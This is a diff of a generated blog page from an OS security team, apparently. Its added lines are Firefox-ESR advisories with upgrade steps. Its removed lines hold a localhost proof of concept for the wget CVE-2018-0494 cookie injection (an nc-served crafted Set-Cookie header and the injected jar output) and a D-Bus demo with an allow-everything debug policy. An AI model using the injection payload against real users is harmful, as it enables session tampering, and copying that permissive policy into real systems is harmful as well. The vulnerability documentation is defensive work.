-      <a data-url="http://yoursite.com/2022/03/09/cve-2018-0494/" data-id="cl11k4ysv0003b2140nkd5cwe" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5449%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3s000jyy3eazib1ed6" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -398,10 +506,10 @@
 
 
   
-    <article id="post-cve-2018-0494分析" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5451安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2018-0494%E5%88%86%E6%9E%90/" class="article-date">
-  <time datetime="2022-03-09T06:16:09.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5451%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T08:28:00.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -412,7 +520,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2018-0494%E5%88%86%E6%9E%90/">cve-2018-0494分析</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5451%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5451安全公告</a>
     </h1>
   
 
@@ -420,32 +528,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="cve编号"><a href="#cve编号" class="headerlink" title="cve编号"></a>cve编号</h3><p>CVE-2018-0494</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>NFS-SA-202203-0001</p>
-<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>老版本wget的http.c中，set-cookie代码没有对 \n 和 \r做检查，可以被恶意网站将\r\n 写入到cookie jar中，在使用wget进行下载时 随意生成cookie。</p>
-<h3 id="复现方法"><a href="#复现方法" class="headerlink" title="复现方法"></a>复现方法</h3><p>先设置一个小型网络服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~/poc/fix$ echo -ne &#x27;HTTP/1.1 200 OK\r\nContent-Length: 0\r\nSet-Cookie: foo=&quot;bar\r\n\x20.google.com\tTRUE\t/\tFALSE\t1900000000\tinjected\tcookie\r\n\t&quot;;expires=Thursday, 01-Jan-2032 08:00:00 GMT\r\n\r\n&#x27; | nc -v -l 7777</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 7777)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox可以通过脚本使用onblur事件来影响文本显示，以使加载的站点看起来与地址栏中实际加载的站点不同。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5451"><a href="#漏洞编号：-CVE-2017-5451" class="headerlink" title="漏洞编号： CVE-2017-5451"></a>漏洞编号： CVE-2017-5451</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：4-3"><a href="#CVSS3-1评分：4-3" class="headerlink" title="CVSS3.1评分：4.3"></a>CVSS3.1评分：4.3</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
 
-<p> 使用wget获取恶意网址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~$ wget --save-cookies jar.txt http://127.0.0.1:7777/plop</span><br><span class="line">--2022-03-09 15:00:09--  http://127.0.0.1:7777/plop</span><br><span class="line">正在连接 127.0.0.1:7777... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：0</span><br><span class="line">正在保存至: “plop.1”</span><br><span class="line"></span><br><span class="line">plop.1                  [ &lt;=&gt;                ]       0  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line">2022-03-09 15:00:09 (0.00 B/s) - 已保存 “plop” [0/0])</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
 
-<p>有漏洞的wget执行后，获取到的jar.txt内容为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~$ cat jar.txt</span><br><span class="line"># HTTP cookie file.</span><br><span class="line"># Generated by Wget on 2022-03-09 15:01:53.</span><br><span class="line"># Edit at your own risk.</span><br><span class="line"></span><br><span class="line">127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	&quot;bar</span><br><span class="line"> .google.com	TRUE	/	FALSE	1900000000	injected	cookie</span><br><span class="line">	&quot;</span><br><span class="line">wky@wky-virtual-machine:~$</span><br></pre></td></tr></table></figure>
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
 
-<p>修复漏洞之后的结果为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-virtual-machine:~$ cat jar.txt</span><br><span class="line"># HTTP cookie file.</span><br><span class="line"># Generated by Wget on 2022-03-09 15:00:09.</span><br><span class="line"># Edit at your own risk.</span><br><span class="line"></span><br><span class="line">127.0.0.1:7777	FALSE	/	FALSE	1956556800	foo	&quot;bar   .google.com	TRUE	/	FALSE	1900000000	injected	cookie  	&quot;</span><br><span class="line">wky@wky-virtual-machine:~$</span><br></pre></td></tr></table></figure>
-
-<p>可以看到修复之后，获取的cookie为一行，而存在漏洞的wget获取的cookie被恶意网址修改成为了两行。</p>
-<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>将wget升级到 wget_1.18-5+deb9u3版本即可。</p>
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5451">https://nvd.nist.gov/vuln/detail/CVE-2017-5451</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2018-0494%E5%88%86%E6%9E%90/" data-id="cl0j9vkt80000lq14g58519y6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5451%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3t000kyy3e80fy0rve" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li></ul>
-
     </footer>
   </div>
   
@@ -453,10 +570,10 @@
 
 
   
-    <article id="post-dbus-qtdemo使用文档" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5462安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/02/24/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/" class="article-date">
-  <time datetime="2022-02-24T08:44:53.000Z" itemprop="datePublished">2022-02-24</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5462%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T08:25:34.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -467,7 +584,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/02/24/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/">dbus_qtdemo使用文档</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5462%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5462安全公告</a>
     </h1>
   
 
@@ -475,60 +592,105 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="dbus替代sudo-NOPASSWD的qt方案示例说明"><a href="#dbus替代sudo-NOPASSWD的qt方案示例说明" class="headerlink" title="dbus替代sudo NOPASSWD的qt方案示例说明"></a>dbus替代sudo NOPASSWD的qt方案示例说明</h2><p>撰写人：系统安全组</p>
-<p>此文档提供一种使用dbus的机制来替代系统某些脚本权限过高的问题，我们系统中对一 些管理脚本赋予了sudo的NOPASSWD权限，如果脚本被修改执行，那么脚本可以直接 获取root权限，这个存在很大的安全隐患。 现在使用dbus写了一个demo，demo分为服务端和客戶端，客戶端相当于之前系统中的 管理脚本，只有普通用戶权限，将需要root权限的操作放到server端里去执行。</p>
-<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="实现简介"><a href="#实现简介" class="headerlink" title="实现简介"></a>实现简介</h3><p>qt demo的模拟场景一个是需要root权限执行 autitcl命令时，有客户端发送method call 来请求，由服务端来执行具体的操作，以及一个发送signal的演示</p>
-<h3 id="代码编译"><a href="#代码编译" class="headerlink" title="代码编译"></a>代码编译</h3><p>需要安装的开发包libdbus-1-dev及需要移动一下头文件:</p>
-<p>$ sudo apt install libdbus-1-dev -y<br>$ sudo cp /usr/lib/x86_64-linux-gnu/dbus-1.0/include/dbus/dbus-arch-deps.h /usr/include/dbus-1.0/dbus/</p>
-<p>服务端编译</p>
-<p>服务端代码是由c写的，进入c_service/编译service代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-pc:~/qt$ cd c_service/</span><br><span class="line">wky@wky-pc:~/qt/c_service$ make</span><br></pre></td></tr></table></figure>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox使用的网络安全服务 (NSS) 库中的 DRBG 编号存在生成缺陷。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5462"><a href="#漏洞编号：-CVE-2017-5462" class="headerlink" title="漏洞编号： CVE-2017-5462"></a>漏洞编号： CVE-2017-5462</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：5-3"><a href="#CVSS3-1评分：5-3" class="headerlink" title="CVSS3.1评分：5.3"></a>CVSS3.1评分：5.3</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
 
-<p>移动编译好的demo程序到/usr/bin/: </p>
-<p>wky@wky-pc: sudo cp demo /usr/bin/</p>
-<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><h4 id="1conf配置"><a href="#1conf配置" class="headerlink" title="1conf配置"></a>1conf配置</h4><p>因为使用的是system bus，我们还需要给配置一下接口的conf文件，创建一个/etc/dbus-1/system.d/test1.conf内容如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Bus that listens on a debug pipe and doesn&#x27;t create any restrictions --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;</span><br><span class="line"> &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;</span><br><span class="line">&lt;busconfig&gt;</span><br><span class="line">  &lt;type&gt;system&lt;/type&gt;</span><br><span class="line"></span><br><span class="line">  &lt;listen&gt;unix:tmpdir=/tmp&lt;/listen&gt;</span><br><span class="line"></span><br><span class="line">  &lt;standard_system_servicedirs /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;policy context=&quot;default&quot;&gt;</span><br><span class="line">    &lt;!-- Allow everything to be sent --&gt;</span><br><span class="line">    &lt;allow send_destination=&quot;*&quot; eavesdrop=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;!-- Allow everything to be received --&gt;</span><br><span class="line">    &lt;allow eavesdrop=&quot;true&quot;/&gt;</span><br><span class="line">    &lt;!-- Allow anyone to own anything --&gt;</span><br><span class="line">    &lt;allow own=&quot;*&quot;/&gt;</span><br><span class="line">    &lt;allow user=&quot;*&quot;/&gt;</span><br><span class="line">  &lt;/policy&gt;</span><br><span class="line"></span><br><span class="line">&lt;/busconfig&gt;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
 
-<p>此文件中几个关键的配置说明:</p>
-<p> system dbus 服务的bus类型，分为system和session，我们要垮用戶通信，就需要用 system总线 unix:tmpdir=/tmp 设置监听地址</p>
-<p> dbus service文件目录，在/usr/share/dbus-1/system-services下 配置dbus的一些策略</p>
-<p>主要是注册com.dbus.receiver_app，send_interface和send_destination为了方便 调试我这里都是用*。</p>
-<h4 id="2-服务自启动配置"><a href="#2-服务自启动配置" class="headerlink" title="2 服务自启动配置"></a>2 服务自启动配置</h4><p>为了使服务端随着系统启动就进行自启动，需要配置/usr/share/dbus-1/system-services/com.example.SampleService.service文件，示例如下: 在/usr/share/ dbus-1/system-services/下创建一个com.dbus.receiver_app.service</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wky@wky-pc:~$ cat /usr/share/dbus-1/system-services/com.dbus.receiver_app.service</span><br><span class="line">[D-BUS Service]</span><br><span class="line">Name=com.dbus.receiver_app</span><br><span class="line">Exec=/usr/bin/demo receive</span><br><span class="line">User=root</span><br></pre></td></tr></table></figure>
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
 
-<p>这个文件是用来给dbus服务程序做按需启动的，当客戶端发起请求时，会根据 test1.conf中的 在/usr/share/dbus-1/system-services/找到对应的service文件，来 启动dbus的服务程序。</p>
-<p> Name=com.dbus.receiver_app 这个跟代码里服务程序的bus name对应起来。 Exec=/usr/bin/demo receive 这个为启动服务程序的方式。</p>
-<p> User=root 启动服务程序的用戶，因为我们是为了替代sudo nopasswd权限滥用问 题，服务端就用root就可以。</p>
-<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>编译客户端，进入到src目录中编译qt代码</p>
-<p>wky@wky-pc:~/qt$ cd src/</p>
-<p>wky@wky-pc:~/qt/src$ make</p>
-<p>注：新的qt工程如果要用dbus接口，可能需要在Makefile中的INCPATH参数后面补充上 -I/usr/lib/x86_64-linux-gnu/qt5/mkspecs/linux-g++ -I/usr/include/dbus-1.0 -I/usr/lib/x86_64-linux-gnu/dbus-1.0/include -ldbus-1</p>
-<p>然后执行 ./dbus 启动qt客户端</p>
-<p>客户端一共两个按钮，signal按钮是向服务端发送一个信号，信号的信息填写到  路径 的textedit框中就可以发送给服务端</p>
-<p>如果是手动执行的服务端程序就可以看到服务端打印的信息。</p>
-<p>主要功能是第一个按钮 method call，是模拟执行下面这条命令</p>
-<p>auditctl -w /tmp/111 -p wax -k testaudit</p>
-<p>这条命令普通用户权限是无法执行的，只有root用户有权限</p>
-<p>路径 中填入 /tmp/111</p>
-<p>权限 中填入 wax</p>
-<p>key值 中填入 testaudit</p>
-<p>点击method call ，效果如下，如果服务端运行成功，则返回一个sucess</p>
-<p><img src="/Users/wky/Desktop/work/wangkeyi203.github.io/source/_posts/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/success.png" alt="success"></p>
-<p>此时用root用户执行下面命令可以看到规则已经添加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@wky-pc:/home/wky/qt/src# auditctl -l</span><br><span class="line">-w /tmp/111 -p wxa -k testaudit</span><br></pre></td></tr></table></figure>
-
-<p>这时候如果再点击method call ，因为规则已经存在，服务端执行命令失败，则返回一个false</p>
-<p><img src="/Users/wky/Desktop/work/wangkeyi203.github.io/source/_posts/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/false.png" alt="false"></p>
-<p>可以使用root用户执行 auditctl -D 清空规则，再次执行就可以成功</p>
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5462">https://nvd.nist.gov/vuln/detail/CVE-2017-5462</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/02/24/dbus-qtdemo%E4%BD%BF%E7%94%A8%E6%96%87%E6%A1%A3/" data-id="cl0j9vktk0005lq143w7pditl" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5462%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3v000oyy3ebh1le7uc" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dbus/" rel="tag">dbus</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qt/" rel="tag">qt</a></li></ul>
+    </footer>
+  </div>
+  
+</article>
 
+
+  
+    <article id="post-firefox-CVE-2017-5467安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/04/14/firefox-CVE-2017-5467%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T08:20:20.000Z" itemprop="datePublished">2022-04-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5467%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5467安全公告</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox使用 Skia 内容绘制剪切区域边界之外的内容时，可能会导致内存损坏和崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5467"><a href="#漏洞编号：-CVE-2017-5467" class="headerlink" title="漏洞编号： CVE-2017-5467"></a>漏洞编号： CVE-2017-5467</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：7-5"><a href="#CVSS3-1评分：7-5" class="headerlink" title="CVSS3.1评分：7.5"></a>CVSS3.1评分：7.5</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5467">https://nvd.nist.gov/vuln/detail/CVE-2017-5467</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
